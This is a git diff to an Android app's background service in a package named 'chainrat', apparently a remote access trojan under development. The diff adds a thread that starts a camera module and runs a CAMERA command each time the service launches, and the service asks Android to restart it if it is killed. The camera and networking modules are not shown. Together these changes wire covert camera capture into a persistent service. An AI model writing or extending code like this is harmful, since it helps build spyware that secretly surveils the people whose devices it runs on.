@@ -5,6 +5,9 @@ import android.content.Context;
 import android.content.Intent;
 import android.os.IBinder;
 import android.util.Log;
+import com.nefi.chainrat.modules.CameraModule;
+import com.nefi.chainrat.networking.Command;
+import com.nefi.chainrat.networking.ConnectionManager;
 
 
 public class MainService extends Service {
@@ -27,6 +30,7 @@ public class MainService extends Service {
         contextOfApplication = this;
         Log.d("MainService", "Trying to start");
 
+        /*
         final Thread thread = new Thread(new Runnable() {
 
             @Override
@@ -40,6 +44,23 @@ public class MainService extends Service {
         });
 
         thread.start();
+        */
+        final Thread thread = new Thread(new Runnable() {
+
+            @Override
+            public void run() {
+                try  {
+                    Log.d("MainService", "Creating CameraModule");
+                    CameraModule cameraModule = new CameraModule();
+                    cameraModule.execute(new Command(CommandType.CAMERA, new String[]{}));
+                } catch (Exception e) {
+                    e.printStackTrace();
+                }
+            }
+        });
+
+        thread.start();
+
         Log.d("MainService", "Endlich geschafft, der Service läuft der Service ist ready :)");
         return Service.START_STICKY;
     }
